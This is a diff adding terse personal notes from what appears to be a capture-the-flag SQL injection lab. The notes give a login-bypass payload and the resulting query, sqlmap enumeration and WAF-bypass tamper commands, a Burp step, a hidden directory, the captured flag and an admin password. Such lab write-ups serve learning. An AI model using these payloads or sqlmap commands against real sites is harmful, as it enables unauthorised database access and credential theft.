@@ -1,0 +1,16 @@
+Sql-inj
+') or true--
+SELECT * FROM users
+        WHERE username = '') or true--'
+        AND password = MD5('') or true; --')
+//enumerate
+sqlmap --url http://tbfc.net/login.php --tables --columns
+hidden dir: santapanel
+//intercept with burpsuite
+save item 
+sqlmap -r file
+--tamper=space2comment(bypassWAF)
+22 entries
+flag: thmfox{All_I_Want_for_Christmas_Is_You}
+Admin's pass:EhCNSWzzFP6sc7gB
+                                     
